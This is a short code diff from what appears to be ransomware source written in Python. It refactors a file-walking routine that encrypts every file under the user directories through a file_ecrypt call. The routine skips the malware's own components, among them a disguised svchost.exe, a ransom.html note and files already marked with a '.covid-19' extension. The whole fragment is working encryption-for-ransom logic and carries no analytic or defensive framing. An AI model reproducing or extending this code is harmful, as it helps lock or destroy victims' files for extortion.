@@ -32,10 +32,14 @@ def filelist():
     for user in rep:
         for root, dirs, files in os.walk(user):
             for file in files:
-                if(file != "GuiCounter.exe" and file != "svchost.exe" and file != "image.jpg" and file != "vcruntime140.dll" and file != "python37.dll" and file != "tk86t.dll" and file != "tcl86t.dll" and file != "library.zip" and file != "tclIndex"):
+                my_files = ["GuiCounter.exe", "svchost.exe", "image.jpg", "windows-installer.ico", \
+                "vcruntime140.dll", "python37.dll", "python3.dll", "ransom.html", \
+                "tk86t.dll", "tcl86t.dll", "library.zip", "tclIndex" ]
+                if not(file in my_files):
                     for ext in file.split("."):
                         if(file.endswith(ext)):
-                            if(ext != "pyc" and ext != "pyd" and ext != "tcl" and ext != "h" and ext != "msg" and ext != "enc"):
+                            my_ext = ["pyc", "pyd", "tcl", "h", "msg", "enc", "covid-19"]
+                            if not(ext in my_ext):
                                 try:
                                     ally = os.path.join(root, file)
                                     file_ecrypt(key, ally)
